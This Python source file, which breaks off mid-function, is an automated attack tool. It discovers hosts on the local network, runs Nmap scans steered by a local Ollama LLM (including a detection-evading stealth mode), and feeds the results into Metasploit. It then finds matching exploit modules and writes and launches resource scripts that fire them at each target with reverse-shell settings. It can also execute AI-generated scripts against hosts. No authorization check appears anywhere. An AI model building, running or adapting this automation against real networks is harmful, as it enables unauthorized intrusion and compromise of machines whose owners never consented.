#!/usr/bin/env python3
# Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration
# This script combines Nmap scanning with Ollama LLM for adaptive reconnaissance
# and optionally integrates with Metasploit for exploitation

import os
import sys
import time
import json
import socket
import random
import logging
import argparse
import ipaddress
import datetime
import subprocess
import threading
import traceback
import re
import netifaces
import requests
import nmap
import multiprocessing
import tempfile
import stat
import signal

from typing import List, Dict, Any, Optional, Tuple

# Set up logging
logger = logging.getLogger("adaptive_scanner")
logger.setLevel(logging.INFO)

# Add console handler if not already added
if not logger.handlers:
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

class NetworkDiscovery:
    """Class to handle automatic network discovery."""
    
    def __init__(self, interface=None, network=None, timeout=1):
        self.interface = interface
        self.network = network  # Can be specified in CIDR notation (e.g., "192.168.1.0/24")
        self.timeout = timeout
        
    def get_interface_info(self):
        """Get information about the selected network interface."""
        try:
            # If interface is specified, use it
            if self.interface:
                if self.interface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(self.interface)
                    if netifaces.AF_INET in addrs:
                        ipinfo = addrs[netifaces.AF_INET][0]
                        return {
                            'interface': self.interface,
                            'addr': ipinfo['addr'],
                            'netmask': ipinfo.get('netmask', '255.255.255.0')
                        }
                    else:
                        logger.error(f"Interface {self.interface} has no IPv4 address")
                else:
                    logger.error(f"Interface {self.interface} not found")
            
            # If no interface is specified or the specified one is invalid, find default
            gws = netifaces.gateways()
            if 'default' in gws and netifaces.AF_INET in gws['default']:
                default_gw, default_iface = gws['default'][netifaces.AF_INET]
                addrs = netifaces.ifaddresses(default_iface)
                if netifaces.AF_INET in addrs:
                    ipinfo = addrs[netifaces.AF_INET][0]
                    self.interface = default_iface  # Save the found interface
                    return {
                        'interface': default_iface,
                        'addr': ipinfo['addr'],
                        'netmask': ipinfo.get('netmask', '255.255.255.0')
                    }
            
            # If still not found, try the first interface with an IPv4 address
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ipinfo = addrs[netifaces.AF_INET][0]
                    if ipinfo['addr'] != '127.0.0.1':  # Skip loopback
                        self.interface = iface  # Save the found interface
                        return {
                            'interface': iface,
                            'addr': ipinfo['addr'],
                            'netmask': ipinfo.get('netmask', '255.255.255.0')
                        }
            
            # If all else fails, fall back to localhost
            logger.warning("Could not find a suitable network interface, using localhost")
            return {
                'interface': 'lo',
                'addr': '127.0.0.1',
                'netmask': '255.0.0.0'
            }
            
        except Exception as e:
            logger.error(f"Error getting interface information: {str(e)}")
            logger.debug(traceback.format_exc())
            return {
                'interface': 'unknown',
                'addr': '127.0.0.1',
                'netmask': '255.255.255.0'
            }
    
    def get_network_cidr(self):
        """Get the network address in CIDR notation (e.g., 192.168.1.0/24)."""
        # If network is already specified, use it
        if self.network:
            return self.network
        
        try:
            # Get interface info
            interface_info = self.get_interface_info()
            ip = interface_info['addr']
            netmask = interface_info['netmask']
            
            # Convert IP and netmask to network address
            ip_obj = ipaddress.IPv4Address(ip)
            netmask_obj = ipaddress.IPv4Address(netmask)
            
            # Calculate network address
            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
            
            # Calculate prefix length from netmask
            prefix_len = bin(int(netmask_obj)).count('1')
            
            # Create CIDR notation
            cidr = f"{network_addr}/{prefix_len}"
            
            logger.info(f"Determined network: {cidr}")
            self.network = cidr
            return cidr
            
        except Exception as e:
            logger.error(f"Error calculating network CIDR: {str(e)}")
            logger.debug(traceback.format_exc())
            return "192.168.1.0/24"  # Default fallback
    
    def ping_host(self, host):
        """Check if a host is up using a ping."""
        try:
            if os.name == "nt":  # Windows
                ping_cmd = ["ping", "-n", "1", "-w", str(int(self.timeout * 1000)), host]
            else:  # Unix/Linux
                ping_cmd = ["ping", "-c", "1", "-W", str(int(self.timeout)), host]
                
            result = subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return result.returncode == 0
            
        except Exception as e:
            logger.debug(f"Error pinging {host}: {str(e)}")
            return False
    
    def get_all_hosts(self):
        """Get all possible hosts in the network."""
        try:
            network_cidr = self.get_network_cidr()
            network = ipaddress.IPv4Network(network_cidr, strict=False)
            
            # Get all hosts in the network (excluding network address and broadcast)
            hosts = [str(host) for host in network.hosts()]
            
            return hosts
        except Exception as e:
            logger.error(f"Error getting hosts from network: {str(e)}")
            logger.debug(traceback.format_exc())
            return []
    
    def discover_hosts(self):
        """Discover active hosts in the network using parallel pings."""
        logger.info("Starting host discovery...")
        
        try:
            # Get all possible hosts
            all_hosts = self.get_all_hosts()
            
            if not all_hosts:
                logger.warning("No hosts found in network")
                return []
            
            logger.info(f"Scanning {len(all_hosts)} potential hosts in {self.network}...")
            
            # Use multiprocessing to speed up discovery
            active_hosts = []
            
            # Handle smaller networks directly
            if len(all_hosts) <= 256:
                with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
                    results = pool.map(self.ping_host, all_hosts)
                    active_hosts = [host for host, is_up in zip(all_hosts, results) if is_up]
            else:
                # For larger networks, process in batches
                batch_size = 256
                for i in range(0, len(all_hosts), batch_size):
                    batch = all_hosts[i:i+batch_size]
                    with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
                        results = pool.map(self.ping_host, batch)
                        active_hosts.extend([host for host, is_up in zip(batch, results) if is_up])
                    
                    logger.info(f"Processed {i+len(batch)}/{len(all_hosts)} hosts, found {len(active_hosts)} active")
            
            # Add our own IP to the list if not already there
            own_ip = self.get_interface_info().get('addr')
            if own_ip and own_ip not in active_hosts and own_ip != "127.0.0.1":
                active_hosts.append(own_ip)
            
            logger.info(f"Host discovery complete. Found {len(active_hosts)} active hosts.")
            return active_hosts
            
        except Exception as e:
            logger.error(f"Error during host discovery: {str(e)}")
            logger.debug(traceback.format_exc())
            
            # Try to at least return our own IP
            try:
                own_ip = self.get_interface_info().get('addr')
                if own_ip and own_ip != "127.0.0.1":
                    return [own_ip]
            except:
                pass
                
            return []

    def discover_networks(self):
        """Discover additional networks connected to this host."""
        try:
            # Get all interfaces
            networks = []
            for iface in netifaces.interfaces():
                # Skip loopback
                if iface == 'lo':
                    continue
                
                # Get addresses for this interface
                if netifaces.AF_INET in netifaces.ifaddresses(iface):
                    for addr_info in netifaces.ifaddresses(iface)[netifaces.AF_INET]:
                        if 'addr' in addr_info and 'netmask' in addr_info:
                            ip = addr_info['addr']
                            netmask = addr_info['netmask']
                            
                            # Skip localhost
                            if ip.startswith('127.'):
                                continue
                                
                            # Calculate network CIDR
                            ip_obj = ipaddress.IPv4Address(ip)
                            netmask_obj = ipaddress.IPv4Address(netmask)
                            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
                            prefix_len = bin(int(netmask_obj)).count('1')
                            cidr = f"{network_addr}/{prefix_len}"
                            
                            if cidr not in networks:
                                networks.append(cidr)
            
            return networks
            
        except Exception as e:
            logger.error(f"Error discovering networks: {str(e)}")
            logger.debug(traceback.format_exc())
            return []
    
    def alternative_host_discovery(self):
        """Alternative method to discover hosts using Nmap ARP scan."""
        try:
            logger.info("Using Nmap ARP scan for host discovery")
            
            # Use nmap to perform ARP scan
            nm = nmap.PortScanner()
            network_cidr = self.get_network_cidr()
            
            # Run ARP scan
            nm.scan(hosts=network_cidr, arguments='-sn -PR')
            
            # Extract hosts
            hosts = [host for host in nm.all_hosts() if host != '']
            
            if hosts:
                logger.info(f"Nmap ARP scan found {len(hosts)} hosts")
                return hosts
            else:
                logger.warning("Nmap ARP scan found no hosts")
                return []
                
        except Exception as e:
            logger.error(f"Error in alternative host discovery: {str(e)}")
            logger.debug(traceback.format_exc())
            return []

class AdaptiveNmapScanner:
    """Adaptive Nmap scanner that uses LLMs to optimize scan strategies."""
    
    def __init__(
        self,
        target=None,
        ollama_model="qwen2.5-coder:7b",
        max_iterations=3,
        continuous=False,
        delay=2,
        msf_integration=False,
        exploit=False,
        msf_workspace="adaptive_scan",
        stealth=False,
        auto_script=False,
        quiet=False,
        debug=False,
        auto_discover=False,
        interface=None,
        scan_all=False,
        network=None,
        host_timeout=1,
        custom_scripts=False,
        script_type="bash",
        execute_scripts=False
    ):
        # Set up logging
        self.logger = logging.getLogger("adaptive_scanner")
        
        # Configure console handler if logging level changed
        if debug:
            self.logger.setLevel(logging.DEBUG)
        elif quiet:
            self.logger.setLevel(logging.WARNING)
        else:
            self.logger.setLevel(logging.INFO)
        
        # Runtime configuration
        self.target = target
        self.ollama_model = ollama_model
        self.max_iterations = max_iterations
        self.continuous = continuous
        self.delay = delay
        self.stealth = stealth
        self.auto_discover = auto_discover
        self.interface = interface
        self.scan_all = scan_all
        self.network = network
        self.host_timeout = host_timeout
        
        # Metasploit configuration
        self.msf_integration = msf_integration
        self.exploit = exploit
        self.msf_workspace = msf_workspace
        self.auto_script = auto_script
        
        # Script generation
        self.custom_scripts = custom_scripts
        self.script_type = script_type
        self.execute_scripts = execute_scripts
        self.generated_scripts = []  # Track generated scripts
        
        # State variables
        self.running = True
        self.scan_history = []
        self.discovered_services = {}
        self.current_scan_phase = 0
        self.results = {}
        self.targets = []
        self.current_target_index = 0
        self.discovered_hosts = []
        self.metasploit = None
        
        # Network discovery
        if auto_discover:
            self.network_discovery = NetworkDiscovery(interface=interface)
        else:
            self.network_discovery = None
        
        # Log initialization
        logger.info(f"Initialized Adaptive Nmap Scanner")
        if target:
            logger.info(f"Initial target: {target}")
        if auto_discover:
            logger.info(f"Auto-discovery enabled")
        if custom_scripts:
            logger.info(f"AI script generation enabled")
            if execute_scripts:
                logger.info(f"Automatic script execution enabled")
        
        # Set up signal handler for clean termination
        signal.signal(signal.SIGINT, self._signal_handler)
        
        # If auto-discovery is enabled, perform it now
        if self.auto_discover:
            self._discover_network()
        
        # Initialize Metasploit if enabled
        if self.msf_integration:
            self.setup_metasploit()
    
    def _discover_network(self):
        """Discover the network and hosts."""
        logger.info("Starting network discovery process")
        
        self.network_discovery = NetworkDiscovery(self.interface)
        
        # Get network information
        interface_info = self.network_discovery.get_interface_info()
        logger.info(f"Local IP: {interface_info['addr']}, Netmask: {interface_info['netmask']}")
        
        # Get network CIDR
        network_cidr = self.network_discovery.get_network_cidr()
        logger.info(f"Network CIDR: {network_cidr}")
        
        # Discover other networks
        self.networks = self.network_discovery.discover_networks()
        if self.networks:
            networks_str = ', '.join(self.networks)
            logger.info(f"Discovered additional networks: {networks_str}")
        
        # Discover hosts
        logger.info("Discovering hosts on the network(s)...")
        
        # Start with the primary network
        discovered = self.network_discovery.discover_hosts()
        
        # Try alternative discovery if primary method finds no hosts
        if not discovered:
            logger.info("Primary discovery method found no hosts, trying alternative method")
            discovered = self.network_discovery.alternative_host_discovery()
        
        # Remove local IP from the list if present
        if interface_info['addr'] in discovered:
            discovered.remove(interface_info['addr'])
        
        self.discovered_hosts = discovered
        
        if discovered:
            logger.info(f"Discovered {len(discovered)} hosts: {', '.join(discovered[:5])}" + 
                        (f"... and {len(discovered)-5} more" if len(discovered) > 5 else ""))
            
            # If no target was specified, set the first discovered host as the target
            if not self.target and self.discovered_hosts:
                self.target = self.discovered_hosts[0]
                logger.info(f"No target specified, using first discovered host: {self.target}")
        else:
            logger.warning("No hosts discovered on the network")
            if not self.target:
                logger.error("No target specified and no hosts discovered. Exiting.")
                sys.exit(1)
    
    def next_target(self) -> bool:
        """Move to the next target in the list of discovered hosts."""
        if not self.discovered_hosts:
            return False
            
        self.current_target_index += 1
        if self.current_target_index >= len(self.discovered_hosts):
            logger.info("Reached the end of the target list")
            return False
            
        # Reset state for the new target
        self.target = self.discovered_hosts[self.current_target_index]
        self.scan_history = []
        self.iteration = 0
        self.discovered_services = {}
        
        logger.info(f"Moving to next target: {self.target}")
        return True
    
    def _signal_handler(self, sig, frame):
        """Handle CTRL+C to gracefully terminate the scanning process."""
        logger.warning("Received termination signal. Finishing current scan and exiting...")
        self.running = False
    
    def setup_metasploit(self):
        """Set up Metasploit connection and workspace."""
        try:
            # Import pymetasploit3 only when needed
            from pymetasploit3.msfrpc import MsfRpcClient
            
            logger.info("Connecting to Metasploit RPC server...")
            
            # Try to connect to Metasploit RPC
            try:
                self.metasploit = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=True)
                logger.info("Connected to Metasploit RPC server")
            except:
                # If connection fails, try to start msfrpcd
                logger.info("Could not connect to msfrpcd. Starting msfrpcd service...")
                subprocess.run(
                    ["msfrpcd", "-P", "msf_password", "-S", "-a", "127.0.0.1", "-p", "55553"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    start_new_session=True
                )
                
                # Wait for service to start
                time.sleep(5)
                
                # Try to connect again
                self.metasploit = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=True)
                logger.info("Connected to Metasploit RPC server")
            
            # Create or select workspace
            if self.msf_workspace not in self.metasploit.db.workspaces.list:
                logger.info(f"Creating Metasploit workspace: {self.msf_workspace}")
                self.metasploit.db.workspaces.add(self.msf_workspace)
            
            logger.info(f"Using Metasploit workspace: {self.msf_workspace}")
            self.metasploit.db.workspaces.set(self.msf_workspace)
            
            return True
        except ImportError:
            logger.error("pymetasploit3 not installed. Metasploit integration will not work.")
            logger.error("Install with: pip install pymetasploit3")
            self.msf_integration = False
            return False
        except Exception as e:
            logger.error(f"Error setting up Metasploit: {str(e)}")
            logger.debug(traceback.format_exc())
            self.msf_integration = False
            return False

    def process_results_with_metasploit(self, result):
        """Process the Nmap scan results with Metasploit."""
        if not self.metasploit or not result:
            return
        
        try:
            target = self.target
            if target not in result.get('scan', {}):
                logger.warning(f"Target {target} not found in scan results")
                return
            
            host_data = result['scan'][target]
            
            # Create or update host in MSF database
            logger.info(f"Importing host {target} to Metasploit database")
            
            # Get hostname
            hostname = 'unknown'
            if 'hostnames' in host_data and host_data['hostnames']:
                hostname = host_data['hostnames'][0].get('name', 'unknown')
            
            # Add host to database
            try:
                self.metasploit.db.hosts.report(target, name=hostname)
                logger.info(f"Added host {target} to Metasploit database")
            except Exception as e:
                logger.warning(f"Error adding host to Metasploit: {str(e)}")
            
            # Process open ports
            for protocol in ['tcp', 'udp']:
                if protocol in host_data:
                    for port, port_data in host_data[protocol].items():
                        if port_data['state'] == 'open':
                            service = port_data.get('name', 'unknown')
                            product = port_data.get('product', '')
                            version = port_data.get('version', '')
                            
                            # Add service to database
                            try:
                                self.metasploit.db.services.report(
                                    target, 
                                    port=int(port),
                                    proto=protocol,
                                    name=service,
                                    info=f"{product} {version}".strip()
                                )
                                logger.info(f"Added service {service} on {port}/{protocol} to Metasploit database")
                                
                                # Add to discovered services
                                port_key = f"{port}/{protocol}"
                                self.discovered_services[port_key] = {
                                    "service": service,
                                    "product": product,
                                    "version": version,
                                    "exploited": False
                                }
                            except Exception as e:
                                logger.warning(f"Error adding service to Metasploit: {str(e)}")
            
            # If auto-exploit enabled, find matching exploits
            if self.exploit:
                self.find_matching_exploits()
            
            # If auto-script enabled, generate and run resource script
            if self.auto_script and self.matching_exploits:
                script_path = self.generate_resource_script()
                if script_path:
                    self.run_resource_script(script_path)
        
        except Exception as e:
            logger.error(f"Error processing results with Metasploit: {str(e)}")
            logger.debug(traceback.format_exc())

    def find_matching_exploits(self):
        """Find matching exploits for discovered services."""
        if not self.metasploit or not self.discovered_services:
            return
        
        logger.info("Finding matching exploits for discovered services...")
        
        for port_key, service_info in self.discovered_services.items():
            service = service_info['service']
            product = service_info['product']
            version = service_info['version']
            
            if service == 'unknown':
                continue
            
            search_terms = []
            
            # Different search strategies based on service
            if product:
                # Search by product and version if available
                search_terms.append(f"{product} {version}".strip())
                search_terms.append(product)
            
            # Always include service name
            search_terms.append(service)
            
            # Common services have special searches
            if service in ['http', 'https', 'www']:
                search_terms.append('web')
            elif service in ['smb', 'microsoft-ds']:
                search_terms.extend(['smb', 'windows', 'microsoft'])
            elif service in ['ssh', 'openssh']:
                search_terms.extend(['ssh', 'openssh'])
            elif service in ['ftp']:
                search_terms.extend(['ftp', 'file transfer'])
            
            # Search for each term
            exploits = set()
            for term in search_terms:
                try:
                    search_result = self.metasploit.modules.search(term)
                    for exploit in search_result:
                        # Check if it's a usable exploit or auxiliary module
                        if exploit['type'] in ['exploit', 'auxiliary'] and 'path' in exploit:
                            exploits.add(exploit['path'])
                except Exception as e:
                    logger.warning(f"Error searching for exploits: {str(e)}")
            
            # Store matching exploits
            if exploits:
                self.matching_exploits[port_key] = list(exploits)
                logger.info(f"Found {len(exploits)} potential exploits for {service} on {port_key}")
            else:
                logger.info(f"No exploits found for {service} on {port_key}")
        
        # Log total exploits found
        total_exploits = sum(len(exploits) for exploits in self.matching_exploits.values())
        logger.info(f"Found a total of {total_exploits} potential exploits across all services")

    def generate_resource_script(self):
        """Generate a Metasploit resource script for automated exploitation."""
        if not self.matching_exploits:
            logger.info("No matching exploits to generate resource script")
            return None
        
        try:
            # Create a timestamp for the script name
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            script_name = f"auto_exploit_{timestamp}.rc"
            
            logger.info(f"Generating Metasploit resource script: {script_name}")
            
            with open(script_name, 'w') as f:
                f.write(f"# Auto-generated Metasploit resource script for {self.target}\n")
                f.write(f"# Generated: {timestamp}\n\n")
                
                # Set workspace
                f.write(f"workspace {self.msf_workspace}\n\n")
                
                # Try each exploit for each service
                for port_key, exploits in self.matching_exploits.items():
                    port, protocol = port_key.split('/')
                    service_info = self.discovered_services[port_key]
                    service = service_info['service']
                    
                    f.write(f"# Exploits for {service} on port {port}/{protocol}\n")
                    
                    # Limit to top 3 exploits per service to avoid taking too long
                    for exploit in exploits[:3]:
                        f.write(f"use {exploit}\n")
                        f.write(f"set RHOSTS {self.target}\n")
                        f.write(f"set RPORT {port}\n")
                        
                        # Set common options
                        f.write("set LHOST 0.0.0.0\n")  # This will be replaced with actual local IP
                        f.write("set LPORT 4444\n")
                        
                        # Run exploit with default options
                        f.write("exploit -z\n")
                        
                        # Pause between exploits
                        f.write("sleep 3\n\n")
                
                # Final commands
                f.write("sessions -l\n")
                f.write("# End of script\n")
            
            # Record the script
            self.generated_scripts.append(script_name)
            logger.info(f"Generated resource script: {script_name}")
            
            return script_name
        
        except Exception as e:
            logger.error(f"Error generating resource script: {str(e)}")
            logger.debug(traceback.format_exc())
            return None

    def run_resource_script(self, script_path):
        """Run a Metasploit resource script."""
        if not os.path.exists(script_path):
            logger.error(f"Resource script not found: {script_path}")
            return
        
        try:
            logger.info(f"Running Metasploit resource script: {script_path}")
            
            # Update LHOST in script with local IP
            with open(script_path, 'r') as f:
                content = f.read()
            
            local_ip = self._get_local_ip()
            if local_ip:
                content = content.replace("set LHOST 0.0.0.0", f"set LHOST {local_ip}")
                
                with open(script_path, 'w') as f:
                    f.write(content)
            
            # Run msfconsole with resource script
            command = f"msfconsole -q -r {script_path}"
            logger.info(f"Executing: {command}")
            
            # Run in background to avoid blocking
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait a bit to see if it starts
            time.sleep(2)
            logger.info(f"Started Metasploit process with PID: {process.pid}")
            
            # Don't wait for completion to avoid blocking the script
            # This means the script will continue running in background
        
        except Exception as e:
            logger.error(f"Error running resource script: {str(e)}")
            logger.debug(traceback.format_exc())

    def run_exploits_on_host(self, target):
        """Run all matching exploits against a host."""
        if not self.metasploit or not self.matching_exploits:
            return
        
        logger.info(f"Running exploits against target: {target}")
        
        # Run each exploit through resource script
        script_path = self.generate_resource_script()
        if script_path:
            self.run_resource_script(script_path)
            
            # Mark all services as exploitation attempted
            for port_key in self.matching_exploits.keys():
                if port_key in self.discovered_services:
                    self.discovered_services[port_key]['exploitation_attempted'] = True

    def _get_local_ip(self):
        """Get the local IP address."""
        try:
            # First try to get the interface for the default route
            if self.network_discovery:
                return self.network_discovery.get_interface_info().get('addr')
            
            # Fallback method
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            logger.warning("Could not determine local IP address")
            return "127.0.0.1"

    def run(self):
        """Start the adaptive scanning process."""
        try:
            # Set up Metasploit if enabled
            if self.msf_integration:
                self.setup_metasploit()
            
            # If auto-discovery enabled, try to find targets first
            if self.auto_discover and self.network_discovery:
                logger.info("Starting network discovery")
                if not self.target:
                    discovered_hosts = self.network_discovery.discover_hosts()
                    if not discovered_hosts:
                        logger.error("No hosts discovered. Please check your network connection or specify a target.")
                        return
                    
                    logger.info(f"Discovered {len(discovered_hosts)} hosts: {', '.join(discovered_hosts)}")
                    self.target = discovered_hosts[0]  # Start with the first host
                    self.discovered_hosts = discovered_hosts
                    
                    logger.info(f"Selected initial target: {self.target}")
                else:
                    # User specified a target but still wants auto-discovery
                    self.discovered_hosts = self.network_discovery.discover_hosts()
                    logger.info(f"User-specified target: {self.target}")
                    if self.discovered_hosts:
                        logger.info(f"Also discovered {len(self.discovered_hosts)} additional hosts")
                        # Add user target if not in the list
                        if self.target not in self.discovered_hosts:
                            self.discovered_hosts.append(self.target)
            
            # Log startup information
            logger.info(f"Starting adaptive Nmap scan against {self.target}")
            logger.info(f"Using Ollama model: {self.ollama_model}")
            logger.info(f"Delay between scans: {self.delay} seconds")
            
            if self.continuous:
                logger.info("Running in continuous mode. Press Ctrl+C to stop.")
            else:
                logger.info(f"Maximum iterations: {self.max_iterations}")
                
            if self.msf_integration:
                logger.info("Metasploit integration: ENABLED")
                if self.exploit:
                    logger.info("Automatic exploitation: ENABLED")
                if self.auto_script:
                    logger.info("Auto script generation: ENABLED")
                    
            if self.stealth:
                logger.info("Stealth mode: ENABLED")
            
            # Begin adaptive scanning process
            iteration = 1
            scripts_generated = 0
            
            should_continue = True
            while should_continue and self.running:
                # Check if we've reached the maximum iterations
                if not self.continuous and iteration > self.max_iterations:
                    logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
                    should_continue = False
                else:
                    logger.info(f"\n{'=' * 50}")
                    logger.info(f"Starting scan iteration {iteration} on {self.target}")
                    logger.info(f"{'=' * 50}")
                    
                    # Generate scan parameters
                    scan_params = self.generate_scan_parameters(iteration)
                    result = self.run_nmap_scan(scan_params)
                    
                    if result:
                        # Update scan history
                        self.scan_history.append({
                            "iteration": iteration,
                            "target": self.target,
                            "params": scan_params,
                            "result_summary": self.summarize_results(result)
                        })
                        
                        # Process results with Metasploit if enabled
                        if self.msf_integration:
                            self.process_results_with_metasploit(result)
                            
                            if self.exploit:
                                self.run_exploits_on_host(self.target)
                    
                    # Generate custom script if enabled (after we've gathered enough data)
                    scripts_generated = len(self.generated_scripts)
                    if self.custom_scripts and iteration >= 2 and scripts_generated < 3:
                        self.logger.info(f"Generating custom {self.script_type} script based on scan results...")
                        
                        # Generate script
                        script_path = self.generate_custom_script(script_type=self.script_type)
                        
                        if script_path:
                            # Add to our list of generated scripts
                            self.generated_scripts.append(script_path)
                            
                            # Execute the script if enabled
                            if self.execute_scripts:
                                self.logger.info(f"Executing generated script: {script_path}")
                                self.execute_generated_script(script_path, [self.target])
                            else:
                                self.logger.info(f"Script generated but not executed. To run: {script_path} {self.target}")
                
                    iteration += 1
                    
                    # Check again before waiting to avoid unnecessary delay
                    if not self.continuous and iteration > self.max_iterations:
                        logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
                        should_continue = False
                    else:
                        logger.info(f"Waiting {self.delay} seconds before next scan...")
                        time.sleep(self.delay)
            
        except KeyboardInterrupt:
            logger.info("\nScan interrupted by user. Exiting...")
        except Exception as e:
            logger.error(f"Error during scan: {str(e)}")
            logger.debug(traceback.format_exc())
        finally:
            # Show summary of generated scripts
            if self.custom_scripts and self.generated_scripts:
                logger.info(f"\nGenerated {len(self.generated_scripts)} scripts:")
                for script in self.generated_scripts:
                    logger.info(f"  - {script}")
            
            # Clean up resources
            if self.metasploit:
                try:
                    self.metasploit.disconnect()
                    logger.info("Disconnected from Metasploit")
                except:
                    pass

    def determine_best_script_type(self):
        """Determine the best script type based on discovered services."""
        if not self.discovered_services:
            return "bash"  # Default to bash if no services discovered
        
        # Count service types
        web_services = 0
        database_services = 0
        windows_services = 0
        
        for port_key, service_info in self.discovered_services.items():
            service = service_info.get('service', '').lower()
            
            if service in ['http', 'https', 'www', 'apache', 'nginx', 'iis', 'tomcat']:
                web_services += 1
            elif service in ['mysql', 'postgresql', 'mssql', 'oracle', 'db2']:
                database_services += 1
            elif service in ['smb', 'microsoft-ds', 'netbios', 'ldap', 'kerberos']:
                windows_services += 1
        
        # Choose script type based on discovered services
        if web_services > database_services and web_services > windows_services:
            return "python"  # Python is good for web services
        elif database_services > web_services and database_services > windows_services:
            return "ruby"    # Ruby for database services (like in Metasploit)
        else:
            return "bash"    # Bash for general purpose or Windows services

    def generate_scan_parameters(self, iteration):
        """Generate scan parameters based on current iteration and history."""
        # For first iteration, use basic or stealth scan
        if iteration == 1:
            if self.stealth:
                # Use stealthy scan parameters to avoid detection
                return [
                    "-sS",                 # SYN scan
                    "-T2",                 # Timing template (2 = "polite")
                    "--data-length=15",    # Add random data to packets
                    "--randomize-hosts",   # Scan hosts in random order
                    "--max-retries=1",     # Limit retry attempts
                    "--scan-delay=0.5s",   # Add delay between probes
                    "--min-rate=10",       # Limit packet rate
                    "--reason",            # Show reason for service state
                    "-p-",                 # Scan all ports
                    self.target            # Target IP/host
                ]
            else:
                # Regular initial scan
                return [
                    "-sS",                 # SYN scan
                    "-T4",                 # Timing template (4 = "aggressive")
                    "--min-rate=1000",     # Minimum packet rate
                    "-p-",                 # All ports
                    "--open",              # Only show open ports
                    self.target            # Target IP/host
                ]
        
        # For subsequent iterations, consult with Ollama
        if not self.scan_history:
            # Fallback if somehow we don't have history
            return self.generate_scan_parameters(1)
        
        # Prepare context for Ollama based on scan history
        context = self.prepare_ollama_context()
        
        # Get next scan strategy from Ollama
        prompt = f"""Given the previous Nmap scan results, recommend the next optimal Nmap scan parameters for a {iteration}{'st' if iteration == 1 else 'nd' if iteration == 2 else 'rd' if iteration == 3 else 'th'} iteration scan against {self.target}.

Previous scan information:
{context}

Provide ONLY the Nmap command line parameters (without 'nmap' prefix) for the next scan to gain more information about the target, discover services and potential vulnerabilities.
{'Use stealthy techniques to avoid detection.' if self.stealth else ''}
"""

        # Get response from Ollama
        logger.info("Asking Ollama for next scan strategy...")
        response = self.call_ollama(prompt)
        
        if not response:
            logger.warning("Failed to get response from Ollama, using default parameters")
            # Use a default strategy based on iteration
            if iteration == 2:
                # Service detection on discovered ports
                open_ports = self.get_open_ports_from_history()
                port_spec = f"-p {open_ports}" if open_ports else "-p-"
                return ["-sV", "-O", "--version-all", port_spec, self.target]
            else:
                # Vulnerability scan
                return ["-sV", "-O", "--script=vuln", "--version-all", self.target]
        
        # Parse Ollama response to get Nmap parameters
        scan_params = self.parse_ollama_response(response)
        
        # Make sure we always have the target at the end
        if self.target not in scan_params:
            scan_params.append(self.target)
        
        logger.info(f"Generated scan parameters: {' '.join(scan_params)}")
        return scan_params

    def run_nmap_scan(self, scan_params):
        """Run an Nmap scan with the given parameters and return the result."""
        try:
            logger.info(f"Running Nmap scan with parameters: {' '.join(scan_params)}")
            
            # Remove target from params as nmap_scan() expects it separately
            params = [p for p in scan_params if p != self.target]
            target = self.target
            
            # Initialize nmap scanner
            nm = nmap.PortScanner()
            
            # Execute scan with parameters
            logger.debug(f"Executing: nmap {' '.join(params)} {target}")
            result = nm.scan(hosts=target, arguments=' '.join(params))
            
            if target in nm.all_hosts():
                host_info = nm[target]
                logger.info(f"Scan completed: {len(host_info.get('tcp', {}))} TCP ports and {len(host_info.get('udp', {}))} UDP ports found")
                return result
            else:
                logger.warning(f"No results found for target {target}")
                return None
            
        except nmap.PortScannerError as e:
            logger.error(f"Nmap scan error: {str(e)}")
            return None
        except Exception as e:
            logger.error(f"Error during Nmap scan: {str(e)}")
            logger.debug(traceback.format_exc())
            return None

    def summarize_results(self, result):
        """Create a summary of the scan results for history."""
        if not result or 'scan' not in result:
            return "No results"
        
        target = self.target
        if target not in result['scan']:
            return "Target not found in results"
        
        host_data = result['scan'][target]
        
        summary = {
            "hostname": host_data.get('hostnames', [{'name': 'unknown'}])[0]['name'],
            "state": host_data.get('status', {}).get('state', 'unknown'),
            "open_ports": {}
        }
        
        # Collect TCP ports
        if 'tcp' in host_data:
            for port, port_data in host_data['tcp'].items():
                if port_data['state'] == 'open':
                    summary['open_ports'][f"{port}/tcp"] = {
                        "service": port_data.get('name', 'unknown'),
                        "product": port_data.get('product', ''),
                        "version": port_data.get('version', '')
                    }
        
        # Collect UDP ports
        if 'udp' in host_data:
            for port, port_data in host_data['udp'].items():
                if port_data['state'] == 'open':
                    summary['open_ports'][f"{port}/udp"] = {
                        "service": port_data.get('name', 'unknown'),
                        "product": port_data.get('product', ''),
                        "version": port_data.get('version', '')
                    }
        
        return summary

    def prepare_ollama_context(self):
        """Prepare context from scan history for Ollama."""
        if not self.scan_history:
            return "No previous scan data available."
        
        context = []
        for i, scan in enumerate(self.scan_history[-3:]):  # Use at most the last 3 scans
            params = scan.get('params', [])
            summary = scan.get('result_summary', {})
            
            context.append(f"Scan {i+1}: Parameters: {' '.join(params)}")
            
            if isinstance(summary, dict) and 'open_ports' in summary:
                ports_info = []
                for port_key, port_data in summary['open_ports'].items():
                    service_version = f"{port_data['service']} {port_data['product']} {port_data['version']}".strip()
                    ports_info.append(f"{port_key}: {service_version}")
                
                if ports_info:
                    context.append(f"Results: Found {len(ports_info)} open ports:")
                    context.extend([f"  - {info}" for info in ports_info])
                else:
                    context.append("Results: No open ports found")
            else:
                context.append(f"Results: {summary}")
        
